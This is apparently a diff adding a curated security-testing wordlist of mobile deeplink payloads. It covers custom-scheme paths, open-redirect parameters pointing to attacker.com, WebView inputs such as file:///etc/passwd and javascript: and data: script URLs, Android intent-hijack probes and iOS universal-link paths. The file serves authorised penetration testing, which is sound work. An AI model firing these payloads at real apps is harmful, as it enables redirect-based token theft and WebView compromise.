@@ -1,0 +1,44 @@
+# Mobile deeplink / universal link path seeds
+# Source: OWASP Mobile M1/M4, mobile-analysis.md, PortSwigger OAuth mobile
+# Tier: Curated | Test on device + Burp; authorized only
+
+# --- Custom scheme paths (replace com.target.app://) ---
+com.target.app://
+com.target.app://open
+com.target.app://callback
+com.target.app://oauth/callback
+com.target.app://auth
+com.target.app://login
+com.target.app://reset-password
+com.target.app://verify
+com.target.app://payment
+com.target.app://share
+com.target.app://invite
+com.target.app://webview?url=
+com.target.app://load?url=
+
+# --- Open redirect via deeplink param ---
+?url=https://attacker.com
+?redirect=https://attacker.com
+?next=//attacker.com
+?link=https://attacker.com
+?open=https://attacker.com
+?continue=https://attacker.com
+
+# --- WebView load arbitrary URL ---
+?url=file:///etc/passwd
+?url=javascript:alert(1)
+?url=data:text/html,<script>alert(1)</script>
+?url=http://127.0.0.1:8080
+
+# --- Intent hijack / exported activity probes (Android) ---
+intent://scan/#Intent;scheme=https;package=com.target.app;end
+intent://pay/#Intent;scheme=targetpay;end
+
+# --- iOS universal link paths (https://target.com/...) ---
+/applinks/
+/.well-known/apple-app-site-association
+/oauth/callback
+/mobile/redirect
+/app/deeplink
+/universal-link/
